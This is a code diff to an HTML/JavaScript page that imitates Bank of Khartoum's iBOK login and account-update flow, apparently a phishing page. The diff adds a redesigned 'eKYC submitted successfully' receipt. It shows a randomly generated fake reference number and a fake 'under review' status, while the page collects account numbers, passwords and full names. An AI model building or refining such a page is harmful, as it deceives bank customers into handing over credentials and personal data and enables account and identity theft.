@@ -20,6 +20,7 @@
       --red-dark: #a9161c;
       --red-light: #e53935;
       --gold-banner: #c59b27;
+      --gold-btn: #b3922d;
       --gold-spinner: #d4a017;
       --pink-btn: #e59398;
       --pink-btn-hover: #da7d83;
@@ -760,7 +761,7 @@
       line-height: 1.65;
     }
 
-    /* ================= شاشة جاري تسليم الاستمارة (حسب الصورة المرفقة) ================= */
+    /* ================= شاشة جاري تسليم الإستمارة (بحجم مصغر متناسق) ================= */
     .submission-screen {
       background-color: #ffffff;
       min-height: 100vh;
@@ -768,7 +769,7 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 32px 20px;
+      padding: 24px 16px;
       text-align: center;
     }
 
@@ -776,24 +777,24 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 22px;
-      margin-bottom: 34px;
+      gap: 16px;
+      margin-bottom: 22px;
       direction: ltr;
     }
 
     .step-circle {
-      width: 34px;
-      height: 34px;
+      width: 28px;
+      height: 28px;
       border-radius: 50%;
       display: inline-flex;
       align-items: center;
       justify-content: center;
       font-family: Arial, sans-serif;
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 700;
       color: #ffffff;
       background-color: #2b6be6;
-      transition: background-color 0.25s ease, transform 0.25s ease, box-shadow 0.25s ease;
+      transition: background-color 0.25s ease, transform 0.25s ease, border-color 0.25s ease;
     }
 
     .step-circle.completed {
@@ -804,8 +805,8 @@
     .step-circle.active-step {
       background-color: #ffffff;
       color: #2b6be6;
-      border: 2.5px dashed #2b6be6;
-      transform: scale(1.12);
+      border: 2px dashed #2b6be6;
+      transform: scale(1.08);
     }
 
     .step-circle.active-step.completed {
@@ -814,51 +815,164 @@
     }
 
     .submission-illustration {
-      width: 240px;
+      width: 145px;
       max-width: 100%;
-      margin: 0 auto 28px;
+      margin: 0 auto 18px;
+    }
+
+    .submission-illustration svg {
+      width: 145px;
+      height: 122px;
+      display: block;
+      margin: 0 auto;
     }
 
     .submission-status-text {
-      font-size: 28px;
+      font-size: 20px;
       font-weight: 700;
       color: #b7952b;
       line-height: 1.4;
       direction: rtl;
     }
 
-    /* ================= شاشة النجاح النهائية ================= */
-    .success-screen {
-      background-color: #ffffff;
+    /* ================= شاشة النجاح النهائية (مطابقة للصورة المرفقة) ================= */
+    .ekyc-success-screen {
+      background-color: #e9e9e9;
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 36px 24px;
+      padding: 16px 12px;
+    }
+
+    .ekyc-sheet {
+      width: 100%;
+      background-color: #ffffff;
+      border-radius: 14px;
+      padding: 26px 20px 24px;
+      box-shadow: 0 6px 22px rgba(0, 0, 0, 0.08);
       text-align: center;
     }
 
-    .success-badge {
-      width: 84px;
-      height: 84px;
+    .ekyc-check-circle {
+      width: 56px;
+      height: 56px;
       border-radius: 50%;
-      background-color: #e8f7ee;
-      color: #1f9d47;
+      background-color: #6ab04c;
+      color: #ffffff;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 40px;
-      margin-bottom: 20px;
-      border: 3px solid #22a34a;
+      font-size: 26px;
+      margin: 0 auto 16px;
     }
 
-    .success-title {
+    .ekyc-main-title {
       font-size: 24px;
       font-weight: 700;
-      color: #1b7e3c;
-      line-height: 1.5;
+      color: #222222;
+      margin-bottom: 12px;
+      line-height: 1.35;
+    }
+
+    .ekyc-subtitle {
+      font-size: 13.5px;
+      color: #555555;
+      line-height: 1.65;
+      margin-bottom: 20px;
+      padding: 0 4px;
+    }
+
+    .ekyc-summary-box {
+      background-color: #f4f4f4;
+      border-radius: 8px;
+      padding: 18px 16px;
+      text-align: right;
       margin-bottom: 24px;
+    }
+
+    .ekyc-row-label {
+      font-size: 13px;
+      color: #888888;
+      margin-bottom: 4px;
+    }
+
+    .ekyc-ref-value {
+      font-family: Arial, sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: #222222;
+      margin-bottom: 14px;
+      direction: ltr;
+      text-align: left;
+    }
+
+    .ekyc-date-label {
+      font-size: 13px;
+      color: #888888;
+      margin-bottom: 4px;
+      text-align: center;
+    }
+
+    .ekyc-date-value {
+      font-family: Arial, sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      color: #222222;
+      text-align: center;
+      direction: ltr;
+      margin-bottom: 14px;
+    }
+
+    .ekyc-status-strip {
+      background-color: #e3f2e8;
+      color: #2e6f40;
+      font-size: 14.5px;
+      font-weight: 700;
+      padding: 10px 14px;
+      border-radius: 6px;
+      text-align: right;
+      margin-bottom: 16px;
+    }
+
+    .ekyc-review-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 13px;
+      color: #555555;
+      line-height: 1.65;
+      text-align: right;
+    }
+
+    .ekyc-review-note i {
+      color: #555555;
+      font-size: 16px;
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    .ekyc-download-btn {
+      width: 100%;
+      max-width: 250px;
+      height: 46px;
+      border: none;
+      border-radius: 4px;
+      background-color: var(--gold-btn);
+      color: #ffffff;
+      font-family: 'Cairo', sans-serif;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin: 0 auto;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: filter 0.15s ease;
+    }
+
+    .ekyc-download-btn:hover {
+      filter: brightness(1.06);
     }
 
     .page-footer {
@@ -1060,10 +1174,9 @@
                 id="username"
                 name="username"
                 class="input-control"
-                placeholder="أدخل رقم"
-                inputmode="numeric"
+                placeholder="ادخل رقم الحساب أو رقم المعرفة"
                 autocomplete="off"
-                oninput="handleAccountInput(this)"
+                oninput="checkLoginReady()"
               />
             </div>
 
@@ -1132,7 +1245,7 @@
       </footer>
     </div>
 
-    <!-- ==================== شاشة 3: تحديث بيانات بنك الخرطوم (كاملة بدون متابعة) ==================== -->
+    <!-- ==================== شاشة 3: تحديث بيانات بنك الخرطوم ==================== -->
     <div id="screenUpdate" class="screen">
       <div>
         <header class="top-bar-2">
@@ -1361,7 +1474,7 @@
       </footer>
     </div>
 
-    <!-- ==================== شاشة 5: جاري تسليم الإستمارة (حسب الصورة) ==================== -->
+    <!-- ==================== شاشة 5: جاري تسليم الإستمارة (مصغرة) ==================== -->
     <div id="screenSubmitting" class="screen">
       <div class="submission-screen">
         <div class="stepper-row" aria-label="خطوات التسليم">
@@ -1372,11 +1485,10 @@
         </div>
 
         <div class="submission-illustration" aria-hidden="true">
-          <svg viewBox="0 0 260 220" width="240" height="200" xmlns="http://www.w3.org/2000/svg">
+          <svg viewBox="0 0 260 220" xmlns="http://www.w3.org/2000/svg">
             <ellipse cx="130" cy="202" rx="95" ry="9" fill="#f7e6d9" />
             <circle cx="132" cy="112" r="78" fill="none" stroke="#f5d87d" stroke-width="3" stroke-dasharray="10 10" />
             <circle cx="136" cy="108" r="64" fill="#fbeae3" opacity="0.7" />
-            <!-- ملف الاستمارة الأزرق -->
             <path d="M126 52 H198 C206 52 210 58 206 66 L186 178 C184 186 178 190 170 190 H98 C90 190 86 184 88 176 L112 64 C114 56 119 52 126 52 Z" fill="#2563eb" />
             <path d="M88 176 C86 184 90 190 98 190 H170 C176 190 180 186 182 181 H102 C95 181 91 178 88 176 Z" fill="#1d4ed8" />
             <circle cx="132" cy="84" r="9" fill="#93c5fd" />
@@ -1386,7 +1498,6 @@
             <rect x="118" y="116" width="58" height="4" rx="2" fill="#60a5fa" />
             <rect x="114" y="132" width="44" height="4" rx="2" fill="#60a5fa" />
             <rect x="110" y="142" width="52" height="4" rx="2" fill="#60a5fa" />
-            <!-- الشخصية -->
             <circle cx="88" cy="76" r="10" fill="#f3b694" />
             <path d="M78 73 C78 63 97 62 98 73 C101 82 103 92 98 96 C93 92 94 81 88 78 C83 76 79 78 78 73 Z" fill="#1f2937" />
             <path d="M77 88 L98 88 L103 124 L74 124 Z" fill="#2563eb" />
@@ -1403,33 +1514,42 @@
       </div>
     </div>
 
-    <!-- ==================== شاشة 6: تم التحديث بنجاح ==================== -->
+    <!-- ==================== شاشة 6: تم تقديم eKYC بنجاح ==================== -->
     <div id="screenSuccess" class="screen">
-      <div>
-        <header class="top-bar-2">
-          <div class="top-bar-left">
-            <div class="ibok-logo" dir="ltr">iBOK</div>
-            <div class="top-bar-sub">
-              <span class="ar">بنك الخرطوم</span>
-              <span class="en">Bank of Khartoum</span>
-            </div>
-          </div>
-        </header>
-
-        <div class="success-screen">
-          <div class="success-badge">
+      <div class="ekyc-success-screen">
+        <div class="ekyc-sheet">
+          <div class="ekyc-check-circle" aria-hidden="true">
             <i class="fa-solid fa-check"></i>
           </div>
-          <h1 class="success-title">تم التحديث بنجاح، مبروك</h1>
-          <button type="button" class="login-btn" style="max-width: 240px; justify-content: center;" onclick="openHomeScreen()">
-            <span>العودة للرئيسية</span>
+
+          <h1 class="ekyc-main-title">تم تقديم eKYC بنجاح</h1>
+
+          <p class="ekyc-subtitle">
+            شكرًا! لقد تم استلام طلب تحديث بيانات الحساب بنجاح. سيتم الرد على طلبك قريبا . الرقم المرجعي للطلب هو
+          </p>
+
+          <div class="ekyc-summary-box">
+            <div class="ekyc-row-label">الرقم المرجعي:</div>
+            <div id="referenceNumberValue" class="ekyc-ref-value">BOK-EKYC-2026-849210</div>
+
+            <div class="ekyc-date-label">تاريخ التقديم الوقت</div>
+            <div id="submissionDateValue" class="ekyc-date-value">November 2026 at 17:34 18</div>
+
+            <div class="ekyc-status-strip">الحالة: قيد المراجعة</div>
+
+            <div class="ekyc-review-note">
+              <i class="fa-regular fa-circle-question" aria-hidden="true"></i>
+              <span>
+                ستتم الآن مراجعة معلوماتك من قبل فريق العناية الواجبة في بنك الخرطوم. ستتلقى رسالة نصية وبريدًا إلكترونيا بمجرد اكتمال عملية التحقق.
+              </span>
+            </div>
+          </div>
+
+          <button type="button" class="ekyc-download-btn" onclick="downloadReceiptAndExit()">
+            تحميل الملف و الخروج
           </button>
         </div>
       </div>
-
-      <footer class="page-footer">
-        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
-      </footer>
     </div>
 
   </div>
@@ -1477,11 +1597,6 @@
       showScreen('screenHome');
     }
 
-    function handleAccountInput(input) {
-      input.value = input.value.replace(/\D/g, '');
-      checkLoginReady();
-    }
-
     function checkLoginReady() {
       const acc = document.getElementById('username').value.trim();
       const pass = document.getElementById('password').value.trim();
@@ -1521,7 +1636,7 @@
       const terms = document.getElementById('terms').checked;
 
       if (!acc) {
-        showMessage('loginMessage', 'يرجى إدخال معرف المستخدم.');
+        showMessage('loginMessage', 'يرجى إدخال رقم الحساب أو رقم المعرفة.');
         return;
       }
       if (!pass) {
@@ -1680,6 +1795,20 @@
       startSubmissionProgress();
     }
 
+    function populateReceiptDetails() {
+      const refNum = 'BOK-' + Math.floor(10000000 + Math.random() * 90000000);
+      const now = new Date();
+      const months = [
+        'January', 'February', 'March', 'April', 'May', 'June',
+        'July', 'August', 'September', 'October', 'November', 'December'
+      ];
+      const pad = n => String(n).padStart(2, '0');
+      const formattedDate = `${months[now.getMonth()]} ${now.getFullYear()} at ${pad(now.getHours())}:${pad(now.getMinutes())} ${pad(now.getSeconds())}`;
+
+      document.getElementById('referenceNumberValue').textContent = refNum;
+      document.getElementById('submissionDateValue').textContent = formattedDate;
+    }
+
     function startSubmissionProgress() {
       clearInterval(submissionTimer);
       showScreen('screenSubmitting');
@@ -1695,7 +1824,7 @@
 
           if (i < stepNum) {
             el.classList.add('completed');
-            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:12px;"></i>';
+            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:11px;"></i>';
           } else if (i === stepNum) {
             el.classList.add('active-step');
             el.textContent = String(i);
@@ -1717,13 +1846,44 @@
             const el = document.getElementById('stepCircle' + i);
             el.classList.remove('active-step');
             el.classList.add('completed');
-            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:12px;"></i>';
+            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:11px;"></i>';
           }
+          populateReceiptDetails();
           setTimeout(() => {
             showScreen('screenSuccess');
           }, 600);
         }
       }, 1000);
+    }
+
+    function downloadReceiptAndExit() {
+      const ref = document.getElementById('referenceNumberValue').textContent;
+      const dt = document.getElementById('submissionDateValue').textContent;
+      const fullName = document.getElementById('fullName').value.trim() || '-';
+      const acc = document.getElementById('username').value.trim() || '-';
+
+      const content =
+        `تم تقديم eKYC بنجاح\n` +
+        `الرقم المرجعي: ${ref}\n` +
+        `تاريخ التقديم الوقت: ${dt}\n` +
+        `الحالة: قيد المراجعة\n` +
+        `رقم الحساب / المعرف: ${acc}\n` +
+        `الاسم الرباعي: ${fullName}\n`;
+
+      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `eKYC-${ref}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+
+      showToast('تم تحميل الملف وجاري الخروج...');
+      setTimeout(() => {
+        openHomeScreen();
+      }, 900);
     }
 
     function handleAction(name) {
